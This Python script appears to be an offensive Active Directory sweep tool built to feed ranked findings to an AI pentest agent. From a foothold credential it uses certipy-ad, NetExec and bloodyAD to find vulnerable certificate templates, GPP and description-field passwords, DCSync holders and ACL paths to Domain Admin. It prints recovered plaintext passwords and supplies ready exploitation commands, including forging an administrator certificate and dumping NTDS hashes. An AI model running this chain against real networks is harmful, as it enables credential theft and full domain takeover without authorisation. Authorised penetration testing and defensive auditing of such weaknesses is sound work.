#!/usr/bin/env python3
"""ad_sweep.py - authenticated AD anomaly sweep with a BloodHound-style path engine.

Given a DC IP and a foothold credential, run a broad battery of checks and return a RANKED,
pre-digested findings list. Push the exhaustive breadth into deterministic code; hand the
model only a short ranked anomaly list. This is what a human checklist skips.

Checks (each isolated; one failing does not abort the sweep):
  - ESC (ADCS):     certipy-ad find -vulnerable           -> ESC1..ESC16   (T1649)
  - GPP cpassword:  nxc smb -M gpp_password               -> creds in SYSVOL (T1552.006)
  - AD secrets:     nxc ldap --users (description scan)   -> creds in metadata (T1552.001)
  - Attack paths:   bloodyad SD collection + graph        -> any non-priv principal that
                    reaches Domain Admin via control ACEs (GenericAll/WriteDacl/WriteOwner),
                    DCSync rights, or multi-hop chains    (T1098 / T1003.006)

Why bloodyad and not BloodHound: on a hardened DC (LDAP channel binding enforced) the standard
BloodHound collectors (bloodhound-python, nxc --bloodhound) fail to authenticate. bloodyad
signs/binds correctly, so it is the reliable collection backend here.

RFC1918 targets only unless --allow-public. Output JSON: {domain, dc, findings[], summary}.
"""
import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import subprocess
import sys

ANSI = re.compile(r'\x1b\[[0-9;]*m')
SECRET = re.compile(r'(?i)(pass(word)?|pwd|cred|secret)')
NXC_HOME = "/tmp/nxc"
SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "info": 3}

CONTROL_RIGHTS = {"GENERIC_ALL", "WRITE_DACL", "WRITE_OWNER", "GENERIC_WRITE"}
HVT = {"domain admins", "enterprise admins", "administrators", "domain controllers",
       "enterprise read-only domain controllers", "group policy creator owners",
       "schema admins", "backup operators", "account operators", "print operators",
       "server operators"}
# well-known/default trustees that benignly hold rights everywhere - never flag these
DEFAULT_TRUSTEES = {
    "everyone", "principal_self", "authenticated_users", "local_system", "system",
    "nt authority\\system", "creator_owner", "creator owner", "self",
    "alias_prew2kcompacc", "pre-windows 2000 compatible access",
    "builtin_administrators", "administrators", "account_operators", "account operators",
    "domain admins", "enterprise admins", "schema admins", "domain controllers",
    "enterprise_domain_controllers", "enterprise read-only domain controllers",
    "key admins", "enterprise key admins", "cert publishers", "ras and ias servers",
    "windows_authorization_access_group", "terminal_server_license_servers",
    "denied rodc password replication group", "allowed rodc password replication group",
}


def fail(msg, **x):
    print(json.dumps({"error": msg, **x}))
    sys.exit(1)


def run(cmd, timeout=300):
    os.makedirs(NXC_HOME, exist_ok=True)
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, errors="replace",
                           timeout=timeout,
                           env={**os.environ, "HOME": NXC_HOME, "NXC_HOME": NXC_HOME})
    except FileNotFoundError as e:
        return f"__MISSING__ {e}"
    except subprocess.TimeoutExpired:
        return "__TIMEOUT__"
    return ANSI.sub("", (p.stdout or "") + "\n" + (p.stderr or ""))


def discover_domain(dc):
    text = run(["nxc", "smb", dc], timeout=60)
    m = re.search(r'\(domain:([^)]+)\)', text, re.I)
    return m.group(1).strip() if m else None


# ---------------- targeted misconfig checks ----------------

def check_esc(dc, domain, user, pw):
    if not shutil.which("certipy-ad"):
        return [{"type": "ADCS ESC check skipped", "severity": "info", "detail": "certipy-ad not present"}]
    out = run(["certipy-ad", "find", "-u", f"{user}@{domain}", "-p", pw, "-dc-ip", dc,
               "-vulnerable", "-stdout"], timeout=240)
    findings, tname = [], None
    for line in out.splitlines():
        t = re.search(r'Template Name\s*:\s*(\S+)', line)
        if t:
            tname = t.group(1)
        e = re.search(r'\b(ESC\d{1,2})\b\s*:\s*(.+)', line)
        if e:
            findings.append({
                "type": "ADCS " + e.group(1), "severity": "critical", "technique": "T1649",
                "detail": f"template '{tname}': {e.group(2).strip()}",
                "next": (f"certipy-ad req -u {user}@{domain} -p <pw> -dc-ip {dc} -ca <CA> "
                         f"-template {tname} -upn administrator@{domain} -sid <admin-SID> "
                         f"(the -sid is required on Server 2025); then certipy-ad auth -pfx administrator.pfx")})
    return findings


def check_gpp(dc, user, pw):
    out = run(["nxc", "smb", dc, "-u", user, "-p", pw, "-M", "gpp_password"], timeout=120)
    findings = []
    users = re.findall(r'userName:\s*(\S+)', out)
    pwds = re.findall(r'Password:\s*(.+)', out)
    for u, p in zip(users, pwds):
        clean = re.sub(r'[^\x20-\x7e]', '', p).strip()  # GPP pw can print as raw UTF-16; keep printable
        findings.append({
            "type": "GPP cpassword", "severity": "high", "technique": "T1552.006",
            "detail": f"SYSVOL GPP exposes {u}:{clean}",
            "next": f"validate: nxc smb {dc} -u {u.split(chr(92))[-1]} -p '{clean}'"})
    return findings


def check_descriptions(dc, user, pw):
    out = run(["nxc", "ldap", dc, "-u", user, "-p", pw, "--users"], timeout=120)
    findings = []
    row = re.compile(
        r'^LDAP\s+\S+\s+\d+\s+\S+\s+(?P<u>\S+)\s+'
        r'(?:\d{4}-\d\d-\d\d \d\d:\d\d:\d\d|<never>)\s+\d+\s*(?P<d>.*)$')
    for line in out.splitlines():
        m = row.match(line.strip())
        if m and m.group("d").strip() and SECRET.search(m.group("d")):
            findings.append({
                "type": "AD description secret", "severity": "high", "technique": "T1552.001",
                "detail": f"{m.group('u')} description: {m.group('d').strip()[:512]}",
                "next": f"reuse the credential: nxc smb {dc} -u <user> -p <found-pw>"})
    return findings


def check_notes(dc, domain, user, pw):
    # Surface the LDAP info ('Notes' tab) + comment free-text attributes - the same class of
    # attacker-controllable, recon-collected field as description (BloodHound collects these;
    # this brings ad-sweep to parity). Reuses the path engine's bloodyAD query pattern so it
    # works against the channel-binding-enforced DC. Gated on the secret regex like descriptions.
    if not shutil.which("bloodyad"):
        return []
    base = _bloodyad_base(dc, domain, user, pw)
    out = run(base + ["get", "search", "--filter",
                      "(&(objectCategory=person)(objectClass=user))",
                      "--attr", "distinguishedName,sAMAccountName,info,comment"], timeout=150)
    if out.startswith("__"):
        return [{"type": "notes scan skipped", "severity": "info",
                 "detail": "bloodyad info/comment query failed"}]
    findings, name, attrs = [], None, {}

    def flush():
        nm = name or "?"
        for field in ("info", "comment"):
            val = (attrs.get(field) or "").strip()
            if val and SECRET.search(val):
                findings.append({
                    "type": "AD " + field + " secret", "severity": "high", "technique": "T1552.001",
                    "detail": f"{nm} {field}: {val[:512]}",
                    "next": f"reuse the credential: nxc smb {dc} -u <user> -p <found-pw>"})

    for line in out.splitlines():
        line = line.rstrip()
        m = re.match(r'^distinguishedName:\s*(.+)$', line)
        if m:
            flush()
            name, attrs = None, {}
            continue
        m = re.match(r'^sAMAccountName:\s*(.+)$', line)
        if m:
            name = m.group(1).strip()
            continue
        m = re.match(r'^(info|comment):\s*(.*)$', line)
        if m:
            attrs[m.group(1)] = m.group(2)
            continue
    flush()
    return findings


# ---------------- BloodHound-style path engine (bloodyad backend) ----------------

def _bloodyad_base(dc, domain, user, pw):
    return ["bloodyad", "--host", dc, "-d", domain, "-u", user, "-p", pw]


def _parse_sd_blocks(text):
    """Parse bloodyad --resolve-sd output into per-object dicts:
       {name, dn, members[], aces[{trustees[], rights set, otype}]}. Objects are delimited
       by 'distinguishedName:' lines; ACE fields are 'nTSecurityDescriptor.ACL.N.Field: val'."""
    objs, cur, aces = [], None, {}

    def flush():
        if cur is not None:
            cur["aces"] = [aces[k] for k in sorted(aces, key=int)]
            objs.append(cur)

    for line in text.splitlines():
        line = line.rstrip()
        m = re.match(r'^distinguishedName:\s*(.+)$', line)
        if m:
            flush()
            cur, aces = {"dn": m.group(1).strip(), "name": "", "sid": "", "members": [], "aces": []}, {}
            continue
        if cur is None:
            continue
        m = re.match(r'^sAMAccountName:\s*(.+)$', line)
        if m:
            cur["name"] = m.group(1).strip()
            continue
        m = re.match(r'^objectSid:\s*(.+)$', line)
        if m:
            cur["sid"] = m.group(1).strip()
            continue
        m = re.match(r'^member:\s*(.+)$', line)
        if m:
            cur["members"] = [d.strip() for d in m.group(1).split(';') if d.strip()]
            continue
        m = re.match(r'^nTSecurityDescriptor\.ACL\.(\d+)\.(\w+):\s*(.*)$', line)
        if m:
            idx, key, val = m.group(1), m.group(2), m.group(3).strip()
            ace = aces.setdefault(idx, {"trustees": [], "rights": set(), "otype": ""})
            if key == "Trustee":
                ace["trustees"] = [t.strip() for t in val.split(';') if t.strip()]
            elif key == "Right":
                ace["rights"] = set(r.strip().upper() for r in val.split('|') if r.strip())
            elif key == "ObjectType":
                ace["otype"] = val
    flush()
    return objs


def check_paths(dc, domain, user, pw):
    if not shutil.which("bloodyad"):
        return [{"type": "path engine skipped", "severity": "info", "detail": "bloodyad not present"}]
    base = _bloodyad_base(dc, domain, user, pw)
    domain_dn = "DC=" + domain.replace(".", ",DC=")

    # one SD pull for the domain object, one for all principals
    dom_out = run(base + ["get", "object", domain_dn, "--resolve-sd"], timeout=150)
    obj_out = run(base + ["get", "search", "--filter",
                          "(|(objectClass=user)(objectClass=group)(objectClass=computer))",
                          "--attr", "distinguishedName,sAMAccountName,objectSid,member,nTSecurityDescriptor",
                          "--resolve-sd"], timeout=240)
    if dom_out.startswith("__") and obj_out.startswith("__"):
        return [{"type": "path engine error", "severity": "info",
                 "detail": "bloodyad collection failed (both calls)"}]

    objects = _parse_sd_blocks(obj_out)
    # map SIDs -> friendly names so trustees returned as raw SIDs in the bulk query resolve
    sid_to_name = {o["sid"].lower(): o["name"] for o in objects if o.get("sid") and o.get("name")}

    def resolve(tr):
        return sid_to_name.get(tr.lower(), tr)

    # control edges: trustee -> target_name ; and DCSync property per principal
    controls = {}   # trustee_lower -> set(target_name_lower)
    dcsync = set()  # principals (lower) with replication rights on the domain
    name_of = {}    # lower -> display
    members = {}    # group_lower -> set(member dn)

    def note(n):
        name_of.setdefault(n.lower(), n)

    def consume(target_name, ace_list, is_domain=False):
        tl = target_name.lower()
        note(target_name)
        for ace in ace_list:
            for tr in ace["trustees"]:
                tr = resolve(tr)
                trl = tr.lower()
                if trl in DEFAULT_TRUSTEES:
                    continue
                note(tr)
                if ace["rights"] & CONTROL_RIGHTS:
                    controls.setdefault(trl, set()).add(tl)
                if is_domain and "CONTROL_ACCESS" in ace["rights"] and \
                   re.search(r'(?i)replication-get-changes', ace["otype"]):
                    dcsync.add(trl)

    for o in objects:
        nm = o["name"] or o["dn"]
        consume(nm, o["aces"])
        if o["members"]:
            members[nm.lower()] = set(o["members"])

    if not dom_out.startswith("__"):
        # parse the domain object's ACEs directly (its DCSync grants live here)
        dom_aces = {}
        for line in dom_out.splitlines():
            m = re.match(r'^nTSecurityDescriptor\.ACL\.(\d+)\.(\w+):\s*(.*)$', line)
            if m:
                idx, key, val = m.group(1), m.group(2), m.group(3).strip()
                a = dom_aces.setdefault(idx, {"trustees": [], "rights": set(), "otype": ""})
                if key == "Trustee":
                    a["trustees"] = [t.strip() for t in val.split(';') if t.strip()]
                elif key == "Right":
                    a["rights"] = set(r.strip().upper() for r in val.split('|') if r.strip())
                elif key == "ObjectType":
                    a["otype"] = val
        consume(domain, [dom_aces[k] for k in sorted(dom_aces, key=int)], is_domain=True)

    # path resolution: does principal p reach Domain Admin?
    findings = []

    def reaches_da(p, seen):
        if p in seen:
            return None
        seen = seen | {p}
        if p in dcsync:
            return [f"{name_of.get(p,p)} =DCSync=> domain"]
        for tgt in controls.get(p, ()):
            if tgt in HVT:
                return [f"{name_of.get(p,p)} =Control=> {name_of.get(tgt,tgt)} (Domain Admin)"]
        for tgt in controls.get(p, ()):
            sub = reaches_da(tgt, seen)
            if sub:
                return [f"{name_of.get(p,p)} =Control=> {name_of.get(tgt,tgt)}"] + sub
        return None

    reported = set()
    principals = set(controls) | dcsync
    for p in principals:
        if p in DEFAULT_TRUSTEES or p in HVT:
            continue
        path = reaches_da(p, set())
        if path and p not in reported:
            reported.add(p)
            tech = "T1003.006" if (p in dcsync and len(path) == 1) else "T1098"
            findings.append({
                "type": "Attack path to Domain Admin", "severity": "critical", "technique": tech,
                "detail": f"{name_of.get(p,p)}: " + " -> ".join(path),
                "next": "compromise this principal (cred from another finding) then walk the path"})
    # also surface raw DCSync holders even if already pathed (explicit T1003.006)
    for p in dcsync:
        if p in DEFAULT_TRUSTEES:
            continue
        findings.append({
            "type": "DCSync rights", "severity": "critical", "technique": "T1003.006",
            "detail": f"{name_of.get(p,p)} holds Replication-Get-Changes(-All) on the domain",
            "next": f"as {name_of.get(p,p)}: nxc smb {dc} -u {name_of.get(p,p)} -p <pw> --ntds"})
    if not findings:
        findings.append({"type": "path engine ran", "severity": "info",
                         "detail": f"parsed {len(objects)} principals; no non-default path to DA found"})
    return findings


def main():
    ap = argparse.ArgumentParser(description="Authenticated AD anomaly sweep -> ranked findings.")
    ap.add_argument("dc", help="DC IP (RFC1918 unless --allow-public)")
    ap.add_argument("-u", "--user", required=True, help="foothold username (bare sam)")
    ap.add_argument("-p", "--password", required=True, help="foothold password")
    ap.add_argument("--domain", help="domain/realm (auto-discovered if omitted)")
    ap.add_argument("--allow-public", action="store_true",
                    help="OVERRIDE: permit non-RFC1918 targets")
    args = ap.parse_args()

    try:
        ip = socket.gethostbyname(args.dc)
    except OSError as e:
        fail(f"cannot resolve {args.dc}: {e}")
    if not args.allow_public and not ipaddress.ip_address(ip).is_private:
        fail(f"out-of-scope target {args.dc} ({ip}) is not RFC1918")

    domain = args.domain or discover_domain(args.dc)
    if not domain:
        fail("could not discover domain; pass --domain")

    findings = []
    for fn in (lambda: check_esc(args.dc, domain, args.user, args.password),
               lambda: check_gpp(args.dc, args.user, args.password),
               lambda: check_descriptions(args.dc, args.user, args.password),
               lambda: check_notes(args.dc, domain, args.user, args.password),
               lambda: check_paths(args.dc, domain, args.user, args.password)):
        try:
            findings.extend(fn())
        except Exception as e:
            findings.append({"type": "check error", "severity": "info", "detail": str(e)[:200]})

    findings.sort(key=lambda f: SEV_ORDER.get(f.get("severity"), 9))
    actionable = [f for f in findings if f.get("severity") in ("critical", "high")]
    # compact output: only actionable findings (drop info-level noise to save context)
    print(json.dumps({
        "dc": args.dc, "domain": domain, "auth_user": args.user,
        "actionable_count": len(actionable),
        "findings": actionable,
    }, indent=1))


if __name__ == "__main__":
    main()
